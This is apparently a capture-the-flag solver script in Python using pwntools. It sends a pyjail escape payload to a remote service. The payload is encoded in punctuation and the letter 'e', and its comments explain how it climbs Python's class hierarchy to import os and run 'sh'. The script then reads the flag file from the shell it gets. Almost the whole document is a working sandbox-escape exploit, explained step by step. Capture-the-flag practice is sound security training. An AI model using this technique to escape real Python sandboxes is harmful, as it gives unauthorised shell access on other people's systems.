import os

from pwn import *

# The service is a Python pyjail: user input is run through
#     eval(eval(code, {"__builtins__": {"e": lambda e: e()}}, {}), {"__builtins__": None}, {})
# with `code` restricted to punctuation characters plus the letter "e" (<1500 chars,
# backslash banned). The only callable exposed is `e`, which just calls its argument,
# so arithmetic on the booleans produced by `[]==[]` (False == 0) is used to build small
# integers, `%e`/`%a`/`%c` string-formatting tricks are then used to synthesize an
# arbitrary source-code string without ever typing a letter, digit, or quote. That string
# is handed to the *outer* eval (which has no builtins restriction on expressions, only on
# names) and evaluates to:
#     ().__class__.__mro__[1].__subclasses__()[122].load_module("os").system("sh")
# i.e. walking from an empty tuple up to `object`, grabbing a subclass that exposes the
# legacy `load_module` loader API (`_frozen_importlib.BuiltinImporter` at this fixed
# index, in this exact base image), using it to import `os`, and calling `os.system("sh")`
# to pop a shell, which we then use to read the flag.
PAYLOAD = (
    b'(_:=[]==[],e_:=_+_,_e:=e_*e_,e__:=_e*e_,_e_:=e__*e_,__e:=_e_*e_,ee_:=__e*e_,'
    b'_ee:=(e_/_)**(_e_*__e),(("%"+("%e"%(((_ee)*(_ee)+(_ee))/((_ee)*(_ee))))[_])%e),'
    b'(("%"+((("%"+("%e"%(((_ee)*(_ee)+(_ee))/((_ee)*(_ee))))[_])%e))[_e])*(ee_+_e+e__))'
    b'%((e__+__e,_+e__+__e,e_+_e+e__+__e,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,'
    b'_+e_+__e+ee_,_e+e__+__e+ee_,_+__e+ee_,_+e_+_e_+__e+ee_,_+e_+_e_+__e+ee_,'
    b'_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,e_+_e+e__+__e,_+e_+_e+e__+_e_+ee_,'
    b'_+e_+_e+e__+_e_+ee_,_+_e+e__+__e+ee_,e_+_e_+__e+ee_,_+e_+_e+e__+__e+ee_,'
    b'_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,_+e_+e__+_e_+ee_,_+_e_+__e,'
    b'_+_e+e__+_e_+ee_,e_+_e+e__+__e,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,'
    b'_+e_+_e_+__e+ee_,_+_e+_e_+__e+ee_,e_+__e+ee_,_+e_+__e+ee_,_e+e__+__e+ee_,'
    b'_+__e+ee_,_+e_+_e_+__e+ee_,_+e_+_e_+__e+ee_,_+_e+__e+ee_,_+e_+_e_+__e+ee_,'
    b'_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,e__+__e,_+e__+__e,_+e_+e__+_e_+ee_,'
    b'_+_e_+__e,e_+_e_+__e,e_+_e_+__e,_+_e+e__+_e_+ee_,e_+_e+e__+__e,_e+e__+__e+ee_,'
    b'_+e_+_e+e__+__e+ee_,_+__e+ee_,_e+__e+ee_,_+e_+_e+e__+_e_+ee_,_+_e+e__+__e+ee_,'
    b'_+e_+_e+e__+__e+ee_,_e+__e+ee_,_+_e+_e_+__e+ee_,_e+e__+__e+ee_,_+_e+__e+ee_,'
    b'e__+__e,e_+__e,_+e_+_e+e__+__e+ee_,_+e_+_e_+__e+ee_,e_+__e,_+e__+__e,'
    b'e_+_e+e__+__e,_+e_+_e_+__e+ee_,_+e__+_e_+__e+ee_,_+e_+_e_+__e+ee_,'
    b'_e+_e_+__e+ee_,_+_e+__e+ee_,_+_e+e__+__e+ee_,e__+__e,e_+__e,_+e_+_e_+__e+ee_,'
    b'e__+__e+ee_,e_+__e,_+e__+__e)))[-_]'
)

p = remote(os.environ["SERVICE_APP_MAIN_HOST"], int(os.environ["SERVICE_APP_MAIN_PORT"]))

p.recvuntil(b"Code pls: ")
p.sendline(PAYLOAD)

p.sendline(b"cat /flag.txt")

print(p.recvall(timeout=10).decode(errors="replace"))
